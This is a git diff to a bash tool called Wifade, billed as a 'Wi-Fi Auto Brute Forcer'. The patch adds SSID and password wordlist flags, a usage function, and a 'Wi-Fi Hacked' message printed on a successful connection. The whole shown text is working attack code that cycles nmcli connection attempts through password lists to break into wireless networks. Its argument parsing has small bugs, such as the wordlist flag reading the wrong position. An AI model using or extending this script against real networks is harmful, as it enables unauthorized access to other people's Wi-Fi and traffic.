@@ -16,27 +16,60 @@ echo -e "\n\n\e[31m
 echo -e "\e[31m============\e[32mWi-Fi Auto Brute Forcer\e[31m============\e[0m"
 echo -e " \e[31mTool: \e[0mWifade \e[31mlinux-v1.0\e[0m"
 echo -e " \e[31mAuthor:\e[0m Faded"
+echo -e " \e[35mContributor:\e[0m sapphicart"
 echo -e " \e[31mGitHub:\e[0m https://github.com/anonfaded/wifade"
 echo -e " \e[31mCyber Network:\e[0m 🏴 https://linktr.ee/fadedhood 🏴"
 echo -e " \e[31mUsage:\e[0m 
-  \e[35mConfigure the tool before using, 
+  \e[35mRun with flag -h | --help to see Usage instructions. 
   check the README file at GitHub for all details.\e[0m "
 echo -e "\e[31m===============================================\e[0m"
 
+# Usage instructions
+usage()
+{
+    echo -e "-s | --ssid: Enter a /path/to/file.txt containing list of SSIDs to try. Default ssid.txt"
+    echo -e "-w | --wordlist: Enter a /path/to/file.txt containing a list of passwords. Default passwords.txt"
+    echo -e "-h | --help: Display usage instructions"
+}
 
-# List of Wi-Fi SSIDs to try
+ssid_file=$(cat ssid.txt)
+password_file=$(cat passwords.txt)
 
-SSIDS=("Anonymous") # replace the 'Anonymous' with your hotspot/wifi name (by default script will search for WiFi "Anonymous").
-# To use this tool with multiple Wi-Fi networks, add the SSID names to the SSIDS array above. For example: SSIDS=("Anonymous" "Second WiFi" "Third WiFi") and all of them will be brute forced with the passwords that we specify below.
+# Replace variables with user-defined values
+while [ "$1" != "" ]; do
+    case $1 in
+        -s | --ssid )       shift
+                            ssid_file=$(cat "$1")
+                            ;;
+        -w | --wordlist )   password_file=$(cat "$2")
+                            ;;
+        -h | --help )       usage
+                            exit
+    esac
+    shift
+done
 
+# List of SSIDs and PASSWORDS to iterate over
+SSIDS=()
+PASSWORDS=()
 
-# List of passwords to try
-PASSWORDS=("secret" "p4ssw0rd" "12345678" "admin") ## Add the passwords in double quotes you want to use for brute forcing. This is version 1.0, so there's no option to use a password dictionary yet, but it may be included in future versions.
+# Write all lines of defined file into the SSID and PASSWORD array
+for line in $ssid_file; do
+    SSIDS+=("$line")
+    (( index++ ))
+done
+
+for pass in $password_file; do
+        PASSWORDS+=("$pass")
+        (( index++ ))
+done
 
 # Check current connection status
 function check_already_connected() {
     local ssid=$1
-    local current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
+#   local current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2) Shellcheck Error: SC2154 Check this: https://www.shellcheck.net/wiki/SC2155
+    current_ssid=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
+    local current_ssid
     if [[ "$current_ssid" == "$ssid" ]]; then
         echo -e "\t \e[35m<<< Already connected to \e[35m$ssid >>>\e[0m"
         return 0 # 0 = true in bash script
@@ -68,6 +101,7 @@ for SSID in "${SSIDS[@]}"; do
         CURRENT_SSID=$(nmcli -t -f active,ssid dev wifi | grep yes | cut -d ':' -f2)
         if [ "$CURRENT_SSID" == "$SSID" ]; then
             echo -e "\n\e[32m\t🎉 Success: Connected to $SSID with password \e[35m$PASSWORD\n\e[0m"
+            echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked 💀\n\n"
             break 2 # Exit both loops
         else
             echo -e "\e[31m\t🚫 Failed to connect to $SSID with password \e[35m$PASSWORD\n\e[0m"
@@ -75,5 +109,5 @@ for SSID in "${SSIDS[@]}"; do
     done
 done
 
-echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked 💀\n\n"
+# echo -e "\e[32m\n\t\t\t💀 Wi-Fi Hacked 💀\n\n" (This line should be printed once the connection has been established. Right now, the tool will print Wi-Fi Hacked even if the brute force fails 💀)
 
